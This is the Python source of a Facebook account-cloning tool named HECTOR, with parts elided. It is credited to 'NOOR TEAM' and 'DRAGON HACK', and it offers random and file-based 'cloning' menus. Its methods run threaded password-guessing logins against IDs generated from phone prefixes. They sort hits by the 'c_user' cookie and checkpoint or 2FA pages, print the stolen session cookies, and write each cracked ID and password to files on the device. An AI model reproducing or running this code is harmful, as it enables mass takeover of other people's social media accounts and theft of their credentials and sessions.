...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; HECTOR \x07')
...
ha = current.day
today = date.today()
BRO2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
import random
...
| $$  | $$| $$_____/| $$    $$   | $$  | $$  | $$| $$  \ $$
| $$  | $$|  $$$$$$$|  $$$$$$/   | $$  |  $$$$$$/| $$  | $$
|__/  |__/ \_______/ \______/    |__/   \______/ |__/  |__/
...
\033[1;36m               
 \033[1;37m                  
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mCREATED BY\033[38;5;196m   :\033[38;5;195m  NOOR TEAM             \033[38;5;46m|
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mFACEBOK      \033[38;5;196m: \033[38;5;195m MRx sajad jafari              \033[38;5;46m|
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mGITHUB       \033[38;5;196m: \033[38;5;195m  MRxsajadbro          \033[38;5;46m|
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTOOL STATUS  \033[38;5;196m:\033[38;5;195m  FREE                  \033[38;5;46m|
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTEAM         \033[38;5;196m: \033[38;5;195m DRAGON HACK           \033[38;5;46m|
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTOOL VIRSION \033[38;5;196m:\033[38;5;195m  1.6                   \033[38;5;46m|
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m PLZ SAPPORT ME BRO....
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m NOOR TECH AND DRAGON HACK TEAM....
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××""")
def linex():
	print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
...
def saprate():
    ...
    print('\033[1;32m Example /sdcard/HECTOR.txt')
...
def main():
    ...
    print(f"{YELLOW}[01] {WHITE}RANDOM CLONE")
    print(f"{RED}[02] {WHITE}FILE CLONING")
    print(f"{GREEN}[03] {WHITE}FILE CREATE ")
    print (f"{BLUE}[4] Exit")
    linex()
    NOOR = input("[√] CHOOSE : ")
    if NOOR in ["1","01"]: 
...
def file_crack():
    ...
    linex()
    opt_method = input(f'CHOOSE SERVER {BRO2} : ')
    os.system('clear')
    print(logo)
    ...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/HECTOR_OK.txt\n[•] CP IDS SAVE : /sdcard/HAMII_CP.txt')
...
def method1(ids,names,passlist,total_ids):
    ...
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[HECTOR 🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio HECTOR_OK.mp3")
                print('\r\033[1;32m[HECTOR-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('/sdcard/HECTOR_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d):
                    os.system("play-audio HECTOR_2F.mp3")
                    print('\r\033[1;35m[HECTOR-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('/sdcard/HECTOR_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio HECTOR_CP.mp3")
                    print('\r\033[1;31m[HECTOR-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('/sdcard/HECTOR_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
    except Exception as e:
...
def method2(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio HECTOR_OK.mp3")
                print('\r\033[1;32m[HECTOR-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/HECTOR_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                ...
                if 'Enter login code to continue' in str(d.group(1)):
                    os.system("play-audio HECTOR_2F.mp3")
                    print('\r\033[1;35m[HECTOR-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/HECTOR_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio HECTOR_CP.mp3")
                    print('\r\033[1;31m[HECTOR-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('/sdcard/HECTOR_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
...
def random_method(ids,passlist,total_ids):
    ...
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r{WHITE}[HECTOR 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    os.system("play-audio HECTOR_OK.mp3")
                    print('\r\033[1;92m[HECTOR-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/HECTOR_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[141:156]
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        os.system("play-audio HECTOR_2F.mp3")
                        print('\r\033[1;95m[HECTOR-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/HECTOR_2F.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                            ...
                            os.system("play-audio HECTOR_CP.mp3")
                            print('\r\033[1;94m[HECTOR-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/HECTOR_CP.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
         #   else:
               # print(ua_opera)
...
print("\n\n")
xxxx = str(len(ugen))
jalan(" \x1b[38;5;191mTOTAL USER AGENTS : " + xxxx)
...
def passx():
    ...
    print(logo)
    print(' ')
    print(f"{YELLOW}××××××××××××××CHOOSE THE METHOD 2 BEST AND FAST××××××××××××××")
    print(f"{GREEN}[M1] {GREEN}METHOD {GREEN}[1]")
    print(f"{YELLOW}[M2] {RED}METHOD {GREEN}[2]")
    print(f"{BLUE}[M3] {BLACK}METHOD {GREEN}[3]")
    print(f"{RED}[M4] {BLUE}METHOD {GREEN}[4]")
    print(f"\033[1;91m×××××××××××××××××××××××××××××××××××××××××××××××××")
    noor = input("[√] CHOOSE : ")
    if noor in ["1","01"]:
        pass1()
...
def pass1():
    ...
    print(logo)
    print(f"")
    print(f"          LIMITE RA ANTKHAB KO ")
    print(f"")
    limit = int(input(' MASALAN: 2000, 3000, 5000, 100000\n\n PUT CLONING LIMIT: '))
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {GREEN}TOTAL IDZ             : {RED}["+tl+"] ~> M1   ")
        print(f" {GREEN}USER NAME             : {GREEN}"+NameX)
        print(f" {GREEN}NUMBER YOU PUT        : {BLUE}"+code)
        print(f" {GREEN}TODAY DATE & TIME     :{BLUE} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {GREEN}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}×××××××××××××××××××××××××××××××××××××××××××××××××')
        for love in user:
            uid = code+love
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HECTOR-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HECTOR-CP.txt')
...
def pass2():
    ...
    print(f"")
    clear()
    print(f"          SHOMARA ANTKHAB KO LALA ")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mMASALAN\033[0;m]")
    print(f"")
    print(f' {GREEN}[!]AFG SIM BEST CODES 070,078,079,077,074')
    linex()
    code = input(' PUT CODE : ')
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {GREEN}TOTAL IDZ             : {BLUE}["+tl+"] ~> M2 ")
        print(f" {GREEN}USER NAME             : {BLUE}"+NameX)
    ...
    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HECTOR-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HETOR-CP.txt')
    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
...
def pass3():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {RED}["+tl+"] ~> M3 ")
        print(f" {WHITE}USER NAME             : {GREEN}"+NameX)
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{ORANGE} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}======================================================')
        for love in user:
            uid = code+love
...
def pass4():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {RED}["+tl+"] ~> M4 ")
        print(f" {WHITE}USER NAME             : {GREEN}"+NameX)
        print(f" {WHITE}NUMBER YOU PUT        : {ORANGE}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{BLUE} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}======================================================')
        for love in user:
            uid = code+love
...
def freeq(uid,pwx,tl):
    ...
    'sec-fetch-site': 'same-origin',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r{BLUE}[HECTOR-HZR-OK🌸] '+uid+' [LIVE] '+ps+  ' \n \0333Cookie = \033[1;92m'+coki+ ' \n '+pro+' \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/HECTOR-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/HECTOR-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r{ORANGE}[HECTOR-HZR-CP🌙] '+uid+' [MORDA] '+ps+' ')
                    open('/sdcard/HECTOR-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[HECTOR-HZR 🔑] [%s] \33[1;97m[OK:%s{HECTOR2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
